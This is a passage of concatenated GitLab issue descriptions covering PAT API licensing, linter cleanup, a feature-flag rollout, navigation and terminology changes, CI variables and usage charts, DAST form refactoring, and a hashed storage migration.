- [x] The prefix should not be the full **Target URL**, it should only consist of the protocol and the resource name (e.g. if the **Target URL** is `https://gitlab.com/some/path/`, the prefix should be `https://gitlab.com/`)
- [x] The validation file path input should default to the generated validation file's name.
- [x] If the **Target URL** contains a file path, it should be prepended to the validation file's name in the input (e.g. if the **Target URL** is `https://gitlab.com/some/path/`, and the generated file name is `validation_token.txt`, the input defaults to `some/path/validation_token.txt`.
- [x] Finally, the prefix should _always_ end with a slash (e.g. if the **Target URL** is `https://gitlab.com`, the prefix should be `https://gitlab.com/`.

title: Move list/revoke your own PATs to Core
description:
## Problem to solve

In %"13.3" we implemented APIs to allow `admins` to [list PAT tokens](https://gitlab.com/gitlab-org/gitlab/-/issues/227264) of their users and optionally [revoke tokens](https://gitlab.com/gitlab-org/gitlab/-/issues/216004) from their users.

In this first iteration, we did not delineate between the `admin` use case and `user` use case, which means these features are only available in ~"GitLab Ultimate" despite similar features, for `users`, being available in ~"GitLab Core".

## Proposal

1. Move both `list` and `revoke` API capabilities to ~"GitLab Core"

## Further detail

This proposal does _not_ move the `admin` capability out of ~"GitLab Ultimate". `Admins` will still be required to have an ~"GitLab Ultimate" license to `list` and `revoke` the PATs of `users` within their instance.

title: Remove HTML todolist functionality from PO linter
description:
Follow up from:

1. Linting HTML in translations: https://gitlab.com/gitlab-org/gitlab/-/issues/217933
1. Removing all HTML from translations: https://gitlab.com/gitlab-org/gitlab/-/issues/228846


## Goal

To remove all of the functionality supporting a todolist for HTML in translation strings.

All of the HTML has been removed from the strings now, so we want to clean up the todolist functionality that supported the gradual cleanup. This will mean we do not have to maintain un-used code and will stop people from adding new strings to the todolist.

## Affected Code

The following are the major code paths that need to be deleted:

- Todolist file: https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n/html_todo.yml
- Check for ignored strings: https://gitlab.com/gitlab-org/gitlab/-/blob/421ac63d/lib/gitlab/i18n/po_linter.rb#L98-108
- Ignored strings methods: https://gitlab.com/gitlab-org/gitlab/-/blob/421ac63d/lib/gitlab/i18n/translation_entry.rb#L100-112

The supporting specs will also need to be adjusted.

title: [Feature flag] Rollout of `design_management_copy_designs`
description:
<!-- Title suggestion: [Feature flag] Enable description of feature -->

## What

Remove the `:design_management_copy_designs` feature flag added in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41714.

## Owners

- Team: ~"group::knowledge" ~"devops::create" 
- Most appropriate slack channel to reach out to: `#g_create_knowledge`
- Best individual to reach out to: @.luke 

## Expectations

### What are we expecting to happen?

Designs to be moved when an issue is moved https://gitlab.com/gitlab-org/gitlab/-/issues/13426.

### What might happen if this goes wrong?

Worst-case would be the issue move feature is impacted.

### What can we monitor to detect problems with this?

- Grafana [`Projects::IssuesController#move.json` performance](https://dashboards.gitlab.net/d/web-rails-controller/web-rails-controller?orgId=1&var-PROMETHEUS_DS=Global&var-environment=gprd&var-stage=main&var-controller=Projects::IssuesController&var-action=move.json&from=now-1d&to=now&refresh=1m) (latency in particular)
- Sentry for any errors
- Grafana [Sidekiq overview](https://dashboards.gitlab.net/d/sidekiq-main/sidekiq-overview?orgId=1)
- Grafana [Sidekiq queue detail](https://dashboards.gitlab.net/d/sidekiq-queue-detail/sidekiq-queue-detail?orgId=1&var-PROMETHEUS_DS=Global&var-environment=gprd&var-stage=main&var-queue=design_management_copy_design_collection&from=1601501580000&to=1601523239999) for `design_management_copy_design_collection_worker`

## Beta groups/projects

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

- `gitlab-org/gitlab` project

## Roll Out Steps

- [x] Enable on staging
- [x] Test on staging
- [-] ~~Ensure that documentation has been updated~~ (~bug)
- [x] Enable on GitLab.com for individual groups/projects listed above and verify behaviour
- [x] Coordinate a time to enable the flag with `#production` and `#g_delivery` on slack.
- [x] Announce on the issue an estimated time this will be enabled on GitLab.com
- [x] Enable on GitLab.com by running chatops command in `#production`
- [x] Cross post chatops slack command to `#support_gitlab-com` ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#where-to-run-commands)) and in your team channel
- [x] Announce on the issue that the flag has been enabled
- [x] Remove feature flag and add changelog entry
- [x] After the flag removal is deployed, [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel

title: 🎯  Alleviate confusion around "Opened" terminology by changing `opened` to `created` within issuable views
description:
### Insight

Users are confused by our use of `Opened ## minutes ago` in list views. They assume this indicates when the item was literally "opened up"/visited by another teammate or perhaps updated- and not that this is when the item was created. 



### Supporting evidence
> Interview participant: "This is when the issue was last opened or edited"

Dovetail insight link : https://dovetailapp.com/projects/386754d7-5187-4fe1-8a8d-7f1c3e5d4e2f/insights/present/d1c03566-da2c-4548-93b0-0f41d6d419da

### Intended users

* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)
* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)

### Action

Change instances of [-Opened-] in lists to [+Created+] within Epics, Issues, and Merge Requests.

| In a list | Within an item |
| ------ | ------ |
| ![image](/uploads/8b7097f6f636ccb51b334aa341cf5f4c/image.png)| ![image](/uploads/3465fb2846f941c12fcd2c81b439c9c1/image.png)|

### User experience goal

Users understand when an item was created. 

### Resources
 <!--Add resources as links below or as related issues. -->

- :dove: [Dovetail project](https://dovetailapp.com/projects/386754d7-5187-4fe1-8a8d-7f1c3e5d4e2f/readme)
- :mag: [Research issue](https://gitlab.com/groups/gitlab-org/-/epics/5214)

### Tasks
- [x] Assign this issue to the appropriate Product Manager, Product Designer, or UX Researcher.
- [x] Add the appropriate `Group` (such as `~"group::source code"`) label to the issue.  This helps identify and track actionable insights at the group level.
- [ ] Link this issue back to the original research issue in the GitLab UX Research project and the Dovetail project.

We need to make sure we update this in every place it is used.

title: Remove unused DailybuildGroupReportResultsbyGroupFinder
description:
# Original discussion

I've collapsed the original discussion because it's about a specific implementation pattern in a controller that we now want to remove. I'll leave it here for reference so folks can know that this is the same issue, but don't want people reading it as if it's pertinent to the current proposal.

<details>
As a follow up of https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40547/diffs#note_405596614

> @mayra-cabrera: Why do we need `:project_ids` at the end? :thinking: Should it be:

```ruby
params.permit(project_ids: [])
```

> @drewcimino  `permit` returns the hash *with* the passed key, so it'd end up looking like

```ruby
{
  current_user: current_user,
  group: @group,
  project_ids: {
    project_ids: [1,2,3]
  }
)
```

> `require` wouldn't need `[]`, but we don't want to actually require the param be passed at all.

> Does that make sense?

> @mayra-cabrera I wonder if we should change the format a bit to use `params.permit` and then declare that `project_ids` is an array:

```ruby
{ 
  current_user: current_user,
  group: @group 
}.merge(params.permit(:start_date, :ref_path, project_ids: []))
```

> @drewcimino That would work when the request is properly made, but we specifically require `start_date`, `end_date`, and `ref_path` out of the params because they're necessary for querying the coverage data.

> The behavior from `require`ing all the params is consistent with the [other controller that deals with this model](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/projects/ci/daily_build_group_report_results_controller.rb#L49), so I think it makes sense to keep using them unless we want to change it in both places.

> I've tried a bunch of permutations of this, and the cleanest looking thing I came up with is

```ruby
def finder_param
  {
    ref_path: params.require(:ref_path),
    start_date: Date.parse(params.require(:start_date))
    end_date: Date.parse(params.require(:end_date)),
    current_user: current_user,
    group: @group
  }.merge(params.permit(project_ids: []))
end
```

> which still has a problem with the keys being mixed symbols and strings because we're not writing `project_ids:` explicitly. Without a clear and obvious solution to this, would you be alright merging and creating a follow-up for this?

> @mayra-cabrera Just to clarify, I'm fine with having `require` or `permit` to designate the `finder_param` since we don't have strong guidelines for these. I was trying to get rid of `[:project_ids]` at the end of `params.permit(project_ids: [])[:project_ids]` since we don't use that pattern often (Or at least I haven't seen it before). Either way, this can be a follow up as you said
</details>

# Proposal

Given the planned work in [another issue](https://gitlab.com/gitlab-org/gitlab/-/issues/284381#note_457497227), we completely remove the by-group finder in question once the `DailyBuildGroupReportResult` records are available via GraphQL by `namespace_id`. Since they'll be queryable by group via GraphQL, the frontend can begin using that instead of the REST controller, and we can delete the finder once that transition is made.

- [x] Introduce GraphQL API for DailyBuildGroupReportResult records https://gitlab.com/gitlab-org/gitlab/-/merge_requests/46549
- [x] Add queryable namespace_id to GraphQL resolver for DailyBuildGroupReportResult records (add `namespace_id` to `daily_build_group_report_results` table) https://gitlab.com/gitlab-org/gitlab/-/issues/284381
- [ ] Transition all internal `gitlab/gitlab-org` requests for `DailyBuildGroupReportResult` records to GraphQL (Visualizations, https://gitlab.com/gitlab-org/gitlab/-/issues/284381)
- [x] Delete `DailyBuildGroupReportResultByGroupFinder` (This issue, https://gitlab.com/gitlab-org/gitlab/-/issues/246902)

# Risks

1. We could forget about part of the GitLab application that uses this API, which will break if we don't switch it to GraphQL. To mitigate this risk, we should ship Step 3 (https://gitlab.com/gitlab-org/gitlab/-/issues/284381) first and check the controller in Grafana to make sure it receives no requests for a period of days before we ship the removal.

title: Auto-select scanner/site profile if there is only one option
description:
####  Problem
When confronted with the empty `New on-demand scan` form, users didn't realize they had to select a profile from the dropdown in order to proceed.



#### Proposal
When creating a new on-demand scan, if there is only one scanner or site profile option, we should auto-select that profile. This will ensure that new users won't hit any roadblocks when creating a scan for the first time. 


<details>
<summary> Original actionable insight</summary>
Actionable insights always have a follow-up action that needs to take place as a result of the research observation or data, and a clear recommendation or action associated with it. An actionable insight both defines the insight and clearly calls out the next step. These insights are tracked over time.


|   |   |
| ------ | ------ |
| Dovetail link: | https://dovetailapp.com/projects/354235e3-a3d8-41d2-a87e-df06f03f6326/insights/present/2538b396-63fe-45db-96f2-54cb6c699b30 |
| Details: | After creating a new scan or site profile, you are redirected back to the “Create scan” page. Some users did not understand that in order to proceed with a scan, you need to select a scan from the (open) dropdown. |
| Action to take: | Auto-select the most recently created profile. |

Note: this only applies if the user has just created a new profile. If a user is going to “Create scan” page without creating a profile first, there should not be any profile auto-selected.

</details>

title: Requirements Management: Import CSV

title: View historical CI pipeline minute usage by month and project
description:
<!-- The first section "Release notes" is required if you want to have your release post blog MR auto generated. Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Release notes 

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

The CI pipelines minutes usage as reported on the [Usage Quotas](https://gitlab.com/profile/usage_quotas#pipelines-quota-tab) page only shows the current month usage which is reset every month and there is no way to view activity in past months for analyzing historical usage by monthly and by the project. **Now there are two charts that enable users to view their historical usage of CI pipeline minutes for shared runners to make informed decisions.**

### Problem to solve

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

The CI minutes usage as reported on the [Usage Quotas](https://gitlab.com/profile/usage_quotas#pipelines-quota-tab) page only shows current month usage which is reset every month and there is no way to view activity in past months for analyzing historical usage by monthly and by project.

*As a user whose project consumes CI minutes, I want to see historical usage data so that I can anticipate usage in the current month based past months' activity.*

### Intended users

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)

### User experience goal

<!-- What is the single user experience workflow this problem addresses? 
For example, "The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to <perform a specific task>"
https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --> 

Namespace admin or Group admin should be able to see historical CI minutes usage by month and by project for each month.

### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

On the `CI/CD Analytics` page (left menu navigation: Analytics > CI/CD) add CI minutes usage data by month and by project in a given month.

title: [MR Analytics] Add MTTM container (BE)
description:
## Problem
This is the backend implementation issue for https://gitlab.com/gitlab-org/gitlab/-/issues/229389.

## Proposal
The GraphQL API should return the "mean time to merge" (the average amount of time between MR opened and MR merged) for a given time period and given filters.  In the case of this MTTM container the [default time period is 12 months](https://gitlab.com/gitlab-org/gitlab/-/issues/246820#note_413765366).

title: When submitting a Merge Request and Merge Method is set to Fast-forward merge, a generic error message is displayed when a pre-receive hook fails
description:
### Summary When a project's Merge Method is set to "Fast-forward merge", a generic error message is displayed in the UI when a pre-receive hook fails, rather than the specific error message. ### Steps to reproduce * Create a new project * In Settings, set Merge Method to "Fast-forward merge" * Make a change and create an MR * In `/var/opt/gitlab/git-data/repositories/project_name.git`, create directory `custom_hooks` * Create a file titled `pre-receive` in the new directory * Enter the following code in the new file: ``` #!/usr/bin/env python3 import sys print("pre-receive hook error message") sys.exit(1) ``` * Submit the MR, generic error is displayed ### What is the current *bug* behavior? A generic error message is displayed in the UI when a pre-receive hook fails. ### What is the expected *correct* behavior? A detailed error message should replace the generic one ### Relevant logs and/or screenshots ![mr](/uploads/fafd7622a29d8c688219227b6218b244/mr.PNG) Customer ticket (internal): [171831](https://gitlab.zendesk.com/agent/tickets/171831) ### Output of checks #### Results of GitLab environment info

title: Move Kubernetes, Terraform, Serverless into a a new "Infrastructure" nav item
description:
<!-- The first section "Release notes" is required if you want to have your release post blog MR auto generated. Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Release notes 

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

### Problem to solve

As a user of GitLab, it's hard to find the relevant sections of the site, so I can't do my job.

As part of https://gitlab.com/gitlab-org/gitlab/-/issues/211406, we explored different ways of organizing the Operations nav items. As part of our validation for these proposed in https://gitlab.com/gitlab-org/ux-research/-/issues/833, we learned that 91% of the people surveyed don't think Serverless or Kubernetes belong under Operations.

### Intended users

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)
* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops) 
* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)

### User experience goal

<!-- What is the single user experience workflow this problem addresses? 
For example, "The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to <perform a specific task>"
https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --> 

Ensure that our navigation is usable and that our features are discoverable.

### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

Move 

- Serverless
- Kubernetes
- Terraform

into a separate navigation item called **Infrastructure**.

### Further details

<!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. -->

This navigation change will allow us to introduce additional menu items to our navigation **if needed** without overloading the already crowded menu item Operations. In other words it will give the opportunity to the Configure team to own a specific section of the navigation anad make changes as necessary.

### Permissions and Security

title: DRY up direct_asset_url method between GraphQL and REST API
description:
The following discussion from !41170 should be addressed:

- [ ] @nfriend started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41170#note_406237326):  (+5 comments)

    > **Question:** This is an exact copy of the logic in our Grape entity: https://gitlab.com/gitlab-org/gitlab/-/blob/9e7619fafaee88b5d2c2840d11fe19e110ff078e/lib/api/entities/releases/link.rb#L20
    > 
    > Is there a way to share this logic between these two endpoints instead of duplicating it in both places?

## Proposal

- Introduce a presenter class for `Releases::Link` model.
- Move the `direct_asset_url` method to the `Releases::LinkPresenter` class. (If necessary, move `download_url` as well)
- Make sure the `Releases::Link` objects are presented (e.g. `release.link.present` or `present_using`) in both Rest API (`API::Entities::Releases::Link`) and GraphQL API (e.g. `Types::ReleaseAssetLinkType`).
- Make sure this refactoring only affects `direct_asset_url` method, not the other methods are changed/overridden.

title: Add $CI_PROJECT_CONFIG_PATH as a predefined environment variable
description:
<!-- The first section "Release notes" is required if you want to have your release post blog MR auto generated. Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Release notes 

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

### Problem to solve

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

Currently, we [cannot use variables](https://docs.gitlab.com/ee/ci/variables/where_variables_can_be_used.html) in the `include:` section of `gitlab-ci.yml`. Additionally, there is no variable for the a project's CI configuration path, which could add additional flexibility and strength to GitLab's CI offering by allowing customers to control a "central" pipeline configuration that exists independently from a local project's `.gitlab-ci.yml`. 

### Intended users

* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)

### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

Following the implementation of https://gitlab.com/gitlab-org/gitlab/-/issues/30686, we should add a new predefined environment variable: `$CI_PROJECT_CONFIG_PATH` which would point to a project's local `.gitlab-ci.yml` file.

For example:

`Project_A` could configure a `exteranl.gitlab-ci.yml` file to include:

```yaml
include: # include the 
  - file: '$CI_PROJECT_CONFIG_PATH' # .gitlab-ci.yml of
    project: '$CI_PROJECT_PATH' # the project currently creating the pipeline
```

`Project_B` could create its own `.gitlab-ci.yml` file as usual.


When `Project_B` executes its pipeline, it will run the local `.gitlab-ci.yml` configuration as well as the instructions contained in `external.gitlab-ci.yml`.

### Implementation details

- Include `CI_PROJECT_CONFIG_PATH` in the [predefined_project_variables](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/project.rb#L1965) method

The value will be the project's [ci_config_path_or_default](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/project.rb#L2536). It contains any overrides mentioned in the [custom configuration path](https://docs.gitlab.com/ee/ci/pipelines/settings.html#custom-ci-configuration-path), defaulting to `.gitlab-ci.yml` if none is provided.

```ruby
...
  .append(key: 'CI_PROJECT_CONFIG_PATH', value: ci_config_path_or_default)
...
```

- Include documentation changes in https://docs.gitlab.com/ee/ci/variables/predefined_variables.html
- Update existing specs to include the new variable

title: Show the merged version of .gitlab-ci.yml (with include and extends)
description:
<!-- The first section "Release notes" is required if you want to have your release post blog MR auto generated. Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Release notes 

Using the includes keyword when configuring your pipeline help you break down one long pipeline file into multiple files to increase readability, or reduce duplication of the same configuration in multiple places. However, it makes your pipeline configuration hard to follow, in many cases a [pipeline configuration file](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab-ci.yml#L91) could look like a list of multiple lines of includes, in this release we allow you to view the merged version of your pipeline configuration, this way it would be easy to understand your pipeline flow and can make the debugging process easier

### Problem to solve

Currently, the CI Linter validates your CI configuration including all of the includes. However, it's not obvious from the UI. 


<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

### User experience goal

I want to view, the merged CI yaml file in the UI.

https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --> 

### Proposal

We would like to allow our users to see the merged version of gitlab-ci.yml file (with includes and extends) in the pipeline editor. 

We can place the merged yaml view in the "View merged YAML" tab in the editor.

title: [Engineering] new user onboarding default to viewing issue board
description:
### Hypothesis 
We can increase the stage adoption rate by ensuring users see the onboarding issue board 
 
### Supporting Data
Only 2-3% of users in onboarding experiment make it from Group creation to viewing the onboarding issue board - [source](https://app.periscopedata.com/app/gitlab/694835/WIP-Growth-Conversion-Team-Experiment:-New-User-onboarding?widget=9143974&udv=1070573). 
 

 
### Potential experiment experience
For a cohort of users in the new user onboarding experiment after the experience page instead of having them land on the group overview page where they need to follow the tooltips to the issue board, we instead have them directly land on the onboarding issue board. This experiment enrollment should occur on the `Welcome` page so it matches the enrollment experience for the existing onboarding experiment. 
 
Control experience:
* Same as the onboarding experience today where a user selects their experience and then follows tooltips to the issue board

Experiment version: 
* After selecting a value on the experience page the user lands directly on the onboarding issue board

### Experiment success metric
We will look for a statistically significant increase in the SPU (stages per user) in this experiment vs. the existing onboarding experiment that requires following tooltips to the issue board.

### Experiment tracking requirements
In order to track this experiment we will add a new experiment row to the experiments table where we give this a unique experiment ID value. The user will be enrolled in the experiment at the same moment on the welcome page.
* Control: users in this group will receive a `group_type` value of `0` and will be given the existing experiment onboarding experience where after the experience page they're given tooltips directing them to the issue board
* Experiment: users in this group will receive a `group_type` value of `1` after they select a value on the experience page they will be landed on the onboarding issue board

epic.title: New user onboarding default to viewing issue board

title: [FE]: Introduce a feature flag for consolidated Edit/WebIDE button
description:
Before implementing [[FE]: Consolidate the Edit and Web IDE buttons into a single split dropdown](https://gitlab.com/gitlab-org/gitlab/-/issues/246785) we should introduce the feature flag that is going to protect this change and won't make it the default one before it went through thorough testing.

The design and core decisions: https://gitlab.com/gitlab-org/gitlab/-/issues/221247

From the FF description:

> it would be good to have the ability to either assign groups to the feature or assign individual users depending on what we want to do for testing.

### Availability and Testing

The existing tests will need to be updated to go through the dropdown if this feature flag is enabled by default. Please coordinate with a SET if you decide to enable it globally on any environment.

title: [FE]: Consolidate the Edit and Web IDE buttons into a single split dropdown
description:
This is a ~frontend part of the implementation, described in https://gitlab.com/gitlab-org/gitlab/-/issues/221247.

The design description: https://gitlab.com/gitlab-org/gitlab/-/issues/221247

This issue is responsible for:

> * On the File (/-/blob/branch/file) page replace the Edit and Web IDE button with a [split dropdown]. (https://design.gitlab.com/components/button#split-dropdown)
>  * Default button to Edit in Web IDE
>  * Clicking the attached dropdown button opens a dropdown with options to set the default button action
>    * Edit in Web IDE
>    * Edit file
>    * Additional options
>  * Clicking the button should load the Web IDE/Single file editor/Other based on the chosen option
>  * Option choice should be persisted

!Important! The picked option in the dropdown **should be stored in the localStorage**. But this might be already implemented in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/37985 by the time this issue is taken care of.

epic.title: Increase Web IDE Usage over Single File

title: Improve reusability in On-demand DAST Scans form
description:
The following discussion from !40414 should be addressed:

- [x] @dpisek started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40414#note_408256236):  (+1 comment)

    > **thought** (non-blocking / future iteration): it feels like this template is starting to lean towards the larger end :sweat_smile: . 
    > 
    > I am sure you thought about this too but just wanted to check how you feel about splitting it up into sub-components. Not now but in a future iteration? Maybe when the feature flag is removed? Or once we have all options in there? :thinking:

---

The **On-demand DAST Scans** form (`ee/app/assets/javascripts/on_demand_scans/components/on_demand_scans_form.vue`) contains a lot of duplicated code due to **Scanner profiles** and **Site profiles** being functionally very similar.

Let's refactor this component by moving all reusable parts to sub-component(s) to make the the form easier to maintain in the long run.

## Implementation plan

- [x] Abstract profile selectors' shared features in a new component. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41922
- [x] Move the selectors' definitions out of the `OnDemansScansForm` component and into a dedicated settings module. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41922
- [x] Cleanup the `OnDemansScansForm` component by removing all site/scanner profiles-specific bits and replacing them with the abstracted definitions and the new `OnDemandScansProfileSelector` component. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/42013

title: Investigate a less memory-intensive approach for CSV export
description:
### Problem to solve

@ahegyi commented [in an MR review](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/31191#note_408564152):

> (non-blocker): Just want to point out that the current way we write CSV file seems quite memory heavy: 
> 
> 1. Write data in batches into a tempfile.
> 2. **Load the file into memory.**
> 3. Send it back to the client.
> 
> If you would pass a block to the `render` method, it would yield the tempfile object. With that, you might be able to use the `send_file` method (https://apidock.com/rails/ActionController/Streaming/send_file).

### Proposal

Use `send_file` to respond to CSV export requests, or alternatively pass the tempfile block to the `render` method.

title: Hashed Storage: trigger migration to hashed storage via post-deployment migration
description:
In %13.0 we enabled Hashed Storage for everyone. As part of the release post we recommended people to upgrade the remaining legacy storage applications, and gave them a planned 2 releases without automatically migrating. We missed the planned %13.2 release as the one we said we would start to automatically migrating the remaining projects.

We should trigger that in %13.4 and add that to the release post.

With that we can consider that any instance with %13.4 or later should be using Hashed Storage (if for any reason there are still projects that failed to migrate, will trigger a warning when running `gitlab-rake gitlab:check`

epic.title: Hashed Storage as the only storage
